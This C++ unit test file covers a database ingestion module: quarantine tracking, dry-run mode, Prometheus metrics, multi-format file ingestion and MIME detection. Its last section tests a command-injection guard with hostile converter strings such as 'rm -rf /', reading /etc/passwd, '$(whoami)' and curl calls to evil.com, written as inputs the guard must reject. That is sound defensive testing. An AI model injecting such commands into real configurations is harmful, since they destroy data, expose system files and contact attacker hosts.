/**
 * @file test_ingestion_features.cpp
 * @brief Unit tests for new ingestion features:
 *        - JSON text extraction
 *        - HTML/XML text extraction (without pugixml)
 *        - QuarantineEntry defaults
 *        - IngestionReport dry_run / quarantine fields
 *        - IngestionManager dry-run mode
 *        - IngestionManager quarantine tracking
 *        - IngestionMetricsExporter Prometheus text output
 *        - FileSystemIngester HTML/JSON/CSV files
 */

#include <gtest/gtest.h>
#include "ingestion/ingestion_manager.h"
#include "ingestion/filesystem_ingester.h"
#include <filesystem>
#include <fstream>
#include <string>
#include <regex>

using namespace themis::ingestion;

// ============================================================================
// QuarantineEntry – default construction
// ============================================================================

TEST(QuarantineEntryTest, DefaultValues) {
    QuarantineEntry entry;
    EXPECT_TRUE(entry.item_path.empty());
    EXPECT_TRUE(entry.source_id.empty());
    EXPECT_EQ(entry.error_code, IngestionErrorCode::UNKNOWN_ERROR);
    EXPECT_TRUE(entry.error_message.empty());
    EXPECT_EQ(entry.retry_count, 0u);
    // timestamp should be close to now
    auto now = std::chrono::system_clock::now();
    auto diff = std::chrono::duration_cast<std::chrono::seconds>(
        now - entry.timestamp).count();
    EXPECT_LE(std::abs(diff), 10);
}

TEST(QuarantineEntryTest, FieldAssignment) {
    QuarantineEntry entry;
    entry.item_path    = "/data/bad_file.pdf";
    entry.source_id    = "fs_source";
    entry.error_code   = IngestionErrorCode::PROCESSING_FAILED;
    entry.error_message = "Failed to parse PDF";
    entry.retry_count  = 3;

    EXPECT_EQ(entry.item_path, "/data/bad_file.pdf");
    EXPECT_EQ(entry.source_id, "fs_source");
    EXPECT_EQ(entry.error_code, IngestionErrorCode::PROCESSING_FAILED);
    EXPECT_EQ(entry.error_message, "Failed to parse PDF");
    EXPECT_EQ(entry.retry_count, 3u);
}

// ============================================================================
// IngestionReport – new fields
// ============================================================================

TEST(IngestionReportTest, DryRunFieldDefault) {
    IngestionReport report;
    EXPECT_FALSE(report.dry_run);
    EXPECT_TRUE(report.quarantine.empty());
}

TEST(IngestionReportTest, QuarantineVectorUsable) {
    IngestionReport report;
    QuarantineEntry e;
    e.item_path = "test_path";
    report.quarantine.push_back(e);
    EXPECT_EQ(report.quarantine.size(), 1u);
    EXPECT_EQ(report.quarantine[0].item_path, "test_path");
}

// ============================================================================
// IngestionManager – dry-run mode
// ============================================================================

TEST(IngestionManagerDryRunTest, DefaultNotDryRun) {
    IngestionManager mgr("test_db");
    EXPECT_FALSE(mgr.isDryRun());
}

TEST(IngestionManagerDryRunTest, SetDryRunTrue) {
    IngestionManager mgr("test_db");
    mgr.setDryRun(true);
    EXPECT_TRUE(mgr.isDryRun());
}

TEST(IngestionManagerDryRunTest, SetDryRunToggle) {
    IngestionManager mgr("test_db");
    mgr.setDryRun(true);
    EXPECT_TRUE(mgr.isDryRun());
    mgr.setDryRun(false);
    EXPECT_FALSE(mgr.isDryRun());
}

TEST(IngestionManagerDryRunTest, IngestAllFlagPropagated) {
    IngestionManager mgr("test_db");
    mgr.setDryRun(true);

    auto report = mgr.ingestAll();
    EXPECT_TRUE(report.dry_run);
}

TEST(IngestionManagerDryRunTest, DryRunNoSourcesReturnsEmptyReport) {
    IngestionManager mgr("test_db");
    mgr.setDryRun(true);

    auto report = mgr.ingestAll();
    EXPECT_TRUE(report.source_stats.empty());
    EXPECT_EQ(report.total_documents, 0u);
}

TEST(IngestionManagerDryRunTest, DryRunWithFilesystemSource) {
    // Create a temp text file
    auto tmp_dir = std::filesystem::temp_directory_path() / "themis_dryrun_test";
    std::filesystem::create_directories(tmp_dir);
    for (int i = 0; i < 3; ++i) {
        auto p = tmp_dir / ("file" + std::to_string(i) + ".txt");
        std::ofstream f(p);
        f << "content " << i << "\n";
    }

    IngestionManager mgr("test_db");
    mgr.setDryRun(true);

    SourceConfig cfg;
    cfg.source_id = "dryrun_fs";
    cfg.type      = SourceType::FILESYSTEM;
    cfg.location  = tmp_dir.string();
    cfg.options["recursive"] = "false";
    ASSERT_TRUE(mgr.registerSource(cfg));

    auto report = mgr.ingestAll();
    EXPECT_TRUE(report.dry_run);
    // Dry-run should count documents (getDocumentCount = 3) without errors
    auto it = report.source_stats.find("dryrun_fs");
    ASSERT_NE(it, report.source_stats.end());
    EXPECT_EQ(it->second.documents_processed, 3u);
    EXPECT_TRUE(it->second.errors.empty());

    std::filesystem::remove_all(tmp_dir);
}

// ============================================================================
// IngestionManager – quarantine API
// ============================================================================

TEST(IngestionManagerQuarantineTest, InitiallyEmpty) {
    IngestionManager mgr("test_db");
    EXPECT_TRUE(mgr.getQuarantineItems().empty());
}

TEST(IngestionManagerQuarantineTest, DismissNonExistentReturnsFalse) {
    IngestionManager mgr("test_db");
    EXPECT_FALSE(mgr.dismissQuarantineItem("/no/such/path"));
}

TEST(IngestionManagerQuarantineTest, ClearEmptyIsNoOp) {
    IngestionManager mgr("test_db");
    EXPECT_NO_THROW(mgr.clearQuarantine());
    EXPECT_TRUE(mgr.getQuarantineItems().empty());
}

// ============================================================================
// IngestionMetricsExporter – Prometheus text format
// ============================================================================

TEST(IngestionMetricsExporterTest, DefaultPrefix) {
    IngestionMetricsExporter exp;
    IngestionStats stats;
    stats.documents_processed = 42;
    stats.documents_failed    = 2;
    stats.bytes_processed     = 4096;
    stats.elapsed_seconds     = 1.5;
    stats.metrics.retry_count  = 3;
    stats.metrics.error_count  = 2;
    stats.metrics.throughput_docs_per_sec = 28.0;

    std::string text = exp.exportText(stats, "my_source");

    // Must contain metric names with default prefix
    EXPECT_NE(text.find("themis_ingestion_docs_processed_total"), std::string::npos);
    EXPECT_NE(text.find("themis_ingestion_docs_failed_total"), std::string::npos);
    EXPECT_NE(text.find("themis_ingestion_bytes_processed_total"), std::string::npos);
    EXPECT_NE(text.find("themis_ingestion_elapsed_seconds"), std::string::npos);
    EXPECT_NE(text.find("themis_ingestion_retry_total"), std::string::npos);
    EXPECT_NE(text.find("themis_ingestion_errors_total"), std::string::npos);
    EXPECT_NE(text.find("themis_ingestion_throughput_docs_per_sec"), std::string::npos);

    // Must include source_id label
    EXPECT_NE(text.find("source_id=\"my_source\""), std::string::npos);

    // Must contain numeric values
    EXPECT_NE(text.find("42"), std::string::npos);
    EXPECT_NE(text.find("4096"), std::string::npos);
}

TEST(IngestionMetricsExporterTest, CustomPrefix) {
    IngestionMetricsExporter exp;
    exp.setPrefix("acme_ingest");

    IngestionStats stats;
    std::string text = exp.exportText(stats, "src1");

    EXPECT_NE(text.find("acme_ingest_docs_processed_total"), std::string::npos);
    EXPECT_EQ(text.find("themis_ingestion"), std::string::npos);
}

TEST(IngestionMetricsExporterTest, ReportExport) {
    IngestionMetricsExporter exp;

    IngestionReport report;
    report.total_documents    = 100;
    report.total_failures     = 5;
    report.total_time_seconds = 3.0;

    IngestionStats s;
    s.documents_processed = 95;
    s.documents_failed    = 5;
    report.source_stats["src_a"] = s;

    std::string text = exp.exportText(report);

    // Per-source
    EXPECT_NE(text.find("source_id=\"src_a\""), std::string::npos);
    // Aggregate
    EXPECT_NE(text.find("source_id=\"__all__\""), std::string::npos);
    EXPECT_NE(text.find("themis_ingestion_total_documents"), std::string::npos);
    EXPECT_NE(text.find("themis_ingestion_quarantine_size"), std::string::npos);
}

TEST(IngestionMetricsExporterTest, LabelEscaping) {
    IngestionMetricsExporter exp;
    IngestionStats stats;

    // Source ID with special chars that need escaping
    std::string text = exp.exportText(stats, "src\\with\"quotes");

    // Must not produce broken prometheus labels
    EXPECT_NE(text.find("source_id=\"src\\\\with\\\"quotes\""), std::string::npos);
}

TEST(IngestionMetricsExporterTest, HelpsAndTypesPresent) {
    IngestionMetricsExporter exp;
    IngestionStats stats;
    std::string text = exp.exportText(stats, "x");

    // Each metric should have a # HELP and # TYPE line
    EXPECT_NE(text.find("# HELP"), std::string::npos);
    EXPECT_NE(text.find("# TYPE"), std::string::npos);
    EXPECT_NE(text.find("counter"), std::string::npos);
    EXPECT_NE(text.find("gauge"), std::string::npos);
}

// ============================================================================
// FileSystemIngester – new format support
// ============================================================================

static std::filesystem::path makeTempFile(const std::string& name,
                                          const std::string& content) {
    auto p = std::filesystem::temp_directory_path() / name;
    std::ofstream f(p, std::ios::binary);
    f << content;
    return p;
}

TEST(FileSystemIngesterFormatsTest, JsonFileIngested) {
    auto p = makeTempFile("test_ingestion.json",
        R"({"title":"hello world","body":"test content","count":42})");

    FileSystemIngester ingester;
    SourceConfig cfg;
    cfg.source_id = "json_test";
    cfg.type      = SourceType::FILESYSTEM;
    cfg.location  = p.string();
    ASSERT_TRUE(ingester.initialize(cfg));

    auto stats = ingester.ingest("col", nullptr);
    EXPECT_EQ(stats.documents_processed, 1u);
    EXPECT_EQ(stats.documents_failed, 0u);
    EXPECT_GT(stats.bytes_processed, 0u);

    std::filesystem::remove(p);
}

TEST(FileSystemIngesterFormatsTest, HtmlFileFallbackIngested) {
    auto p = makeTempFile("test_ingestion.html",
        "<html><body><p>Hello ThemisDB</p></body></html>");

    FileSystemIngester ingester;
    SourceConfig cfg;
    cfg.source_id = "html_test";
    cfg.type      = SourceType::FILESYSTEM;
    cfg.location  = p.string();
    ASSERT_TRUE(ingester.initialize(cfg));

    auto stats = ingester.ingest("col", nullptr);
    // HTML either extracted via pugixml or falls back to raw bytes
    EXPECT_EQ(stats.documents_processed, 1u);
    EXPECT_GT(stats.bytes_processed, 0u);

    std::filesystem::remove(p);
}

TEST(FileSystemIngesterFormatsTest, XmlFileIngested) {
    auto p = makeTempFile("test_ingestion.xml",
        "<?xml version=\"1.0\"?><root><item>alpha</item><item>beta</item></root>");

    FileSystemIngester ingester;
    SourceConfig cfg;
    cfg.source_id = "xml_test";
    cfg.type      = SourceType::FILESYSTEM;
    cfg.location  = p.string();
    ASSERT_TRUE(ingester.initialize(cfg));

    auto stats = ingester.ingest("col", nullptr);
    EXPECT_EQ(stats.documents_processed, 1u);
    EXPECT_GT(stats.bytes_processed, 0u);

    std::filesystem::remove(p);
}

TEST(FileSystemIngesterFormatsTest, CsvFileIngested) {
    auto p = makeTempFile("test_ingestion.csv",
        "id,name,value\n1,alpha,100\n2,beta,200\n");

    FileSystemIngester ingester;
    SourceConfig cfg;
    cfg.source_id = "csv_test";
    cfg.type      = SourceType::FILESYSTEM;
    cfg.location  = p.string();
    ASSERT_TRUE(ingester.initialize(cfg));

    auto stats = ingester.ingest("col", nullptr);
    EXPECT_EQ(stats.documents_processed, 1u);
    EXPECT_GT(stats.bytes_processed, 0u);

    std::filesystem::remove(p);
}

TEST(FileSystemIngesterFormatsTest, MdFileIngested) {
    auto p = makeTempFile("test_ingestion.md",
        "# Title\n\nSome **markdown** content.\n");

    FileSystemIngester ingester;
    SourceConfig cfg;
    cfg.source_id = "md_test";
    cfg.type      = SourceType::FILESYSTEM;
    cfg.location  = p.string();
    ASSERT_TRUE(ingester.initialize(cfg));

    auto stats = ingester.ingest("col", nullptr);
    EXPECT_EQ(stats.documents_processed, 1u);
    EXPECT_GT(stats.bytes_processed, 0u);

    std::filesystem::remove(p);
}

TEST(FileSystemIngesterFormatsTest, PdfSkippedWithoutError) {
    // When no external converter is configured, PDF files are silently skipped
    // (no error recorded, just 0 documents processed).
    auto p = makeTempFile("test_ingestion.pdf", "%PDF-1.4 fake content");

    FileSystemIngester ingester;
    SourceConfig cfg;
    cfg.source_id = "pdf_test";
    cfg.type      = SourceType::FILESYSTEM;
    cfg.location  = p.string();
    // Explicitly disable converter to ensure consistent behaviour in CI
    cfg.options["pdf_converter"] = "";
    ASSERT_TRUE(ingester.initialize(cfg));

    auto stats = ingester.ingest("col", nullptr);
    // PDF returns empty content when converter is empty → not counted as processed
    EXPECT_EQ(stats.documents_processed, 0u);
    EXPECT_EQ(stats.documents_failed, 0u);

    std::filesystem::remove(p);
}

TEST(FileSystemIngesterFormatsTest, DocxSkippedWithoutError) {
    // DOCX with no converter configured is silently skipped.
    // Build a minimal valid ZIP header (PK\x03\x04) followed by an OOXML marker
    // so MIME detection identifies it as DOCX.
    std::string docx_magic = "PK\x03\x04word/document.xml[Content_Types]";
    auto p = makeTempFile("test_ingestion.docx", docx_magic);

    FileSystemIngester ingester;
    SourceConfig cfg;
    cfg.source_id = "docx_test";
    cfg.type      = SourceType::FILESYSTEM;
    cfg.location  = p.string();
    cfg.options["docx_converter"] = "";
    ASSERT_TRUE(ingester.initialize(cfg));

    auto stats = ingester.ingest("col", nullptr);
    EXPECT_EQ(stats.documents_processed, 0u);
    EXPECT_EQ(stats.documents_failed, 0u);

    std::filesystem::remove(p);
}

TEST(FileSystemIngesterFormatsTest, MultiFormatDirectory) {
    auto tmp_dir = std::filesystem::temp_directory_path()
                   / "themis_multiformat_test";
    std::filesystem::create_directories(tmp_dir);

    // Create one file of each supported format
    {
        std::ofstream f(tmp_dir / "a.txt"); f << "plain text\n";
    }
    {
        std::ofstream f(tmp_dir / "b.json"); f << "{\"k\":\"v\"}";
    }
    {
        std::ofstream f(tmp_dir / "c.html"); f << "<p>html</p>";
    }
    {
        std::ofstream f(tmp_dir / "d.xml");
        f << "<root><x>xml</x></root>";
    }
    {
        std::ofstream f(tmp_dir / "e.csv"); f << "a,b\n1,2\n";
    }
    {
        // PDF with no converter configured should be silently skipped
        std::ofstream f(tmp_dir / "f.pdf"); f << "%PDF fake";
    }

    FileSystemIngester ingester;
    SourceConfig cfg;
    cfg.source_id = "multi_test";
    cfg.type      = SourceType::FILESYSTEM;
    cfg.location  = tmp_dir.string();
    cfg.options["recursive"]     = "false";
    cfg.options["pdf_converter"] = "";   // disable converter in CI
    ASSERT_TRUE(ingester.initialize(cfg));

    auto stats = ingester.ingest("col", nullptr);
    // txt + json + html + xml + csv = 5 processed; pdf = 0 (no converter)
    EXPECT_EQ(stats.documents_processed, 5u);
    EXPECT_EQ(stats.documents_failed, 0u);
    EXPECT_GT(stats.bytes_processed, 0u);
    EXPECT_TRUE(stats.errors.empty());

    std::filesystem::remove_all(tmp_dir);
}

// ============================================================================
// MIME type detection
// ============================================================================

TEST(BinaryMimeDetectionTest, DetectPdfByMagic) {
    std::string pdf_header = "%PDF-1.7 rest of file content";
    EXPECT_EQ(detectBinaryMimeType(pdf_header), BinaryMimeType::PDF);
}

TEST(BinaryMimeDetectionTest, DetectDocxByMagic) {
    // Minimal ZIP header (PK\x03\x04) followed by OOXML content-type marker
    std::string docx_data = {};
    docx_data += "PK";
    docx_data += '\x03';
    docx_data += '\x04';
    docx_data += "word/document.xml[Content_Types]";
    EXPECT_EQ(detectBinaryMimeType(docx_data), BinaryMimeType::DOCX);
}

TEST(BinaryMimeDetectionTest, UnknownForShortBuffer) {
    EXPECT_EQ(detectBinaryMimeType(""), BinaryMimeType::UNKNOWN);
    EXPECT_EQ(detectBinaryMimeType("ABC"), BinaryMimeType::UNKNOWN);
}

TEST(BinaryMimeDetectionTest, UnknownForPlainText) {
    EXPECT_EQ(detectBinaryMimeType("Hello world this is text"), BinaryMimeType::UNKNOWN);
}

TEST(BinaryMimeDetectionTest, UnknownForGenericZip) {
    // ZIP without OOXML markers should not be detected as DOCX
    std::string zip = {};
    zip += "PK";
    zip += '\x03';
    zip += '\x04';
    zip += "some_other_content_here_no_ooxml_marker_present";
    EXPECT_EQ(detectBinaryMimeType(zip), BinaryMimeType::UNKNOWN);
}

// ============================================================================
// BinaryConverter struct and FileSystemIngester API
// ============================================================================

TEST(BinaryConverterTest, DefaultValues) {
    BinaryConverter bc;
    EXPECT_EQ(bc.pdf_converter, "pdftotext");
    EXPECT_EQ(bc.docx_converter, "pandoc");
    EXPECT_TRUE(bc.detect_by_magic);
}

TEST(BinaryConverterTest, SetBinaryConverterViaApi) {
    // Verify that setBinaryConverter is accepted and applied via SourceConfig options
    FileSystemIngester ingester;
    SourceConfig cfg;
    cfg.source_id = "bc_api_test";
    cfg.type      = SourceType::FILESYSTEM;
    cfg.location  = std::filesystem::temp_directory_path().string();
    cfg.options["pdf_converter"]  = "/custom/pdftotext";
    cfg.options["docx_converter"] = "/custom/pandoc";
    cfg.options["detect_by_magic"] = "false";
    EXPECT_TRUE(ingester.initialize(cfg));
    // Just verify no crash and correct initialization
}

TEST(BinaryConverterTest, SetBinaryConverterDirectly) {
    FileSystemIngester ingester;
    SourceConfig cfg;
    cfg.source_id = "bc_direct_test";
    cfg.type      = SourceType::FILESYSTEM;
    cfg.location  = std::filesystem::temp_directory_path().string();
    ASSERT_TRUE(ingester.initialize(cfg));

    BinaryConverter bc;
    bc.pdf_converter  = "";  // disable
    bc.docx_converter = "";  // disable
    bc.detect_by_magic = true;
    EXPECT_NO_THROW(ingester.setBinaryConverter(bc));
}

TEST(BinaryConverterTest, PdfWithDisabledConverterSkippedSilently) {
    std::string pdf_content = "%PDF-1.4 fake pdf data here";
    auto p = std::filesystem::temp_directory_path() / "bc_test.pdf";
    {
        std::ofstream f(p, std::ios::binary);
        f << pdf_content;
    }

    FileSystemIngester ingester;
    SourceConfig cfg;
    cfg.source_id = "bc_pdf_test";
    cfg.type      = SourceType::FILESYSTEM;
    cfg.location  = p.string();
    cfg.options["pdf_converter"] = "";
    ASSERT_TRUE(ingester.initialize(cfg));

    auto stats = ingester.ingest("col", nullptr);
    // With empty converter: silently skip, no error
    EXPECT_EQ(stats.documents_processed, 0u);
    EXPECT_EQ(stats.documents_failed, 0u);
    EXPECT_TRUE(stats.errors.empty());

    std::filesystem::remove(p);
}

TEST(BinaryConverterTest, PdfDetectedByMagicNotExtension) {
    // Create a file with .bin extension but PDF magic bytes
    // → should be detected as PDF by magic and skipped (no converter)
    std::string pdf_magic = "%PDF-1.7 binary file disguised as .bin";
    auto p = std::filesystem::temp_directory_path() / "disguised.bin";
    {
        std::ofstream f(p, std::ios::binary);
        f << pdf_magic;
    }

    FileSystemIngester ingester;
    SourceConfig cfg;
    cfg.source_id = "magic_detect_test";
    cfg.type      = SourceType::FILESYSTEM;
    cfg.location  = p.string();
    cfg.options["pdf_converter"]  = "";  // no converter → skip silently
    cfg.options["detect_by_magic"] = "true";
    ASSERT_TRUE(ingester.initialize(cfg));

    auto stats = ingester.ingest("col", nullptr);
    // MIME detection identified it as PDF, no converter → skip silently
    EXPECT_EQ(stats.documents_processed, 0u);
    EXPECT_EQ(stats.documents_failed, 0u);

    std::filesystem::remove(p);
}

TEST(BinaryConverterTest, MagicDetectionCanBeDisabled) {
    // With detect_by_magic=false a .bin file with PDF header is treated
    // as unknown binary and ingested as raw text
    std::string pdf_magic = "%PDF-1.7 text fallback";
    auto p = std::filesystem::temp_directory_path() / "no_magic_detect.bin";
    {
        std::ofstream f(p, std::ios::binary);
        f << pdf_magic;
    }

    FileSystemIngester ingester;
    SourceConfig cfg;
    cfg.source_id = "no_magic_test";
    cfg.type      = SourceType::FILESYSTEM;
    cfg.location  = p.string();
    cfg.options["detect_by_magic"] = "false";
    ASSERT_TRUE(ingester.initialize(cfg));

    auto stats = ingester.ingest("col", nullptr);
    // Without magic detection the .bin file falls through to the raw-text path
    EXPECT_EQ(stats.documents_processed, 1u);
    EXPECT_GT(stats.bytes_processed, 0u);

    std::filesystem::remove(p);
}

// ============================================================================
// isConverterSafe – command injection guard (security audit)
// ============================================================================

TEST(IsConverterSafeTest, SafeConverterNames) {
    // Plain program names and absolute paths are safe
    EXPECT_TRUE(isConverterSafe("pdftotext"));
    EXPECT_TRUE(isConverterSafe("pandoc"));
    EXPECT_TRUE(isConverterSafe("/usr/bin/pdftotext"));
    EXPECT_TRUE(isConverterSafe("/usr/local/bin/pandoc"));
    EXPECT_TRUE(isConverterSafe("C:\\Program Files\\pdftotext.exe"));
    EXPECT_TRUE(isConverterSafe("./tools/pdftotext"));
}

TEST(IsConverterSafeTest, EmptyConverterIsSafe) {
    // Empty string means "disabled" – treated as safe (no command is spawned)
    EXPECT_TRUE(isConverterSafe(""));
}

TEST(IsConverterSafeTest, InjectionPipeRejected) {
    EXPECT_FALSE(isConverterSafe("pdftotext | cat /etc/passwd"));
    EXPECT_FALSE(isConverterSafe("pdftotext|cat"));
}

TEST(IsConverterSafeTest, InjectionSemicolonRejected) {
    EXPECT_FALSE(isConverterSafe("pdftotext; rm -rf /"));
    EXPECT_FALSE(isConverterSafe(";id"));
}

TEST(IsConverterSafeTest, InjectionAmpersandRejected) {
    EXPECT_FALSE(isConverterSafe("pdftotext && curl evil.com"));
    EXPECT_FALSE(isConverterSafe("pdftotext&"));
}

TEST(IsConverterSafeTest, InjectionDollarRejected) {
    EXPECT_FALSE(isConverterSafe("$HOME/pdftotext"));
    EXPECT_FALSE(isConverterSafe("$(whoami)"));
}

TEST(IsConverterSafeTest, InjectionBacktickRejected) {
    EXPECT_FALSE(isConverterSafe("`id`"));
}

TEST(IsConverterSafeTest, InjectionRedirectRejected) {
    EXPECT_FALSE(isConverterSafe("pdftotext > /tmp/out"));
    EXPECT_FALSE(isConverterSafe("pdftotext < /etc/passwd"));
}

TEST(IsConverterSafeTest, InjectionNewlineRejected) {
    EXPECT_FALSE(isConverterSafe("pdftotext\nid"));
    EXPECT_FALSE(isConverterSafe("pdftotext\rid"));
}

TEST(IsConverterSafeTest, UnsafeConverterSilentlySkippedForPdf) {
    // An unsafe converter is silently rejected – no error, no crash, no execution
    std::string pdf_content = "%PDF-1.4 fake pdf data";
    auto p = std::filesystem::temp_directory_path() / "unsafe_conv_test.pdf";
    auto injection_target = std::filesystem::temp_directory_path() / "pwned_by_themis_test";
    // Ensure the injection target does not exist before the test
    std::filesystem::remove(injection_target);
    {
        std::ofstream f(p, std::ios::binary);
        f << pdf_content;
    }

    FileSystemIngester ingester;
    SourceConfig cfg;
    cfg.source_id = "unsafe_conv_pdf";
    cfg.type      = SourceType::FILESYSTEM;
    cfg.location  = p.string();
    // Shell injection attempt in converter path
    cfg.options["pdf_converter"] = "pdftotext; touch " + injection_target.string();
    ASSERT_TRUE(ingester.initialize(cfg));

    auto stats = ingester.ingest("col", nullptr);
    // File silently skipped – no documents, no errors, no shell execution
    EXPECT_EQ(stats.documents_processed, 0u);
    EXPECT_EQ(stats.documents_failed, 0u);
    EXPECT_TRUE(stats.errors.empty());
    // Verify the injection target was NOT created
    EXPECT_FALSE(std::filesystem::exists(injection_target));

    std::filesystem::remove(p);
}

TEST(IsConverterSafeTest, UnsafeConverterSilentlySkippedForDocx) {
    // Same injection guard applies for the DOCX converter
    std::string docx_magic = {};
    docx_magic += "PK\x03\x04";
    docx_magic += "word/document.xml[Content_Types]";
    auto p = std::filesystem::temp_directory_path() / "unsafe_conv_test.docx";
    {
        std::ofstream f(p, std::ios::binary);
        f << docx_magic;
    }

    FileSystemIngester ingester;
    SourceConfig cfg;
    cfg.source_id = "unsafe_conv_docx";
    cfg.type      = SourceType::FILESYSTEM;
    cfg.location  = p.string();
    cfg.options["docx_converter"] = "pandoc && curl http://evil.example.com";
    ASSERT_TRUE(ingester.initialize(cfg));

    auto stats = ingester.ingest("col", nullptr);
    EXPECT_EQ(stats.documents_processed, 0u);
    EXPECT_EQ(stats.documents_failed, 0u);
    EXPECT_TRUE(stats.errors.empty());

    std::filesystem::remove(p);
}
